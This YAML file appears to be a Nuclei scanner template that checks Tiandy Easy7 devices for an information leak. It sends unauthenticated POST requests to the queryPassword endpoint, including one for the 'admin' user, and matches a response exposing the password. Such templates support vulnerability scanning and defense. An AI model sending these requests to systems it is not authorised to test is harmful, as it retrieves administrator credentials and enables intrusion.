id: tiandy-easy7-querypassword-info-leak
info:
  name: Tiandy Easy7 queryPassword Information Leak
  author: ProjectDiscoveryAI
  severity: medium
  tags: info-leak

http:
  - raw:
      - |
        POST /Easy7/rest/user/queryPassword HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        userName=xxxxxxxxxx
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - '"content":null'

  - raw:
      - |
        POST /Easy7/rest/user/queryPassword HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        userName=admin
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: regex
        part: body
        regex:
          - '"content":"(.*?)"'
      - type: word
        part: body
        negative: true
        words:
          - '<'
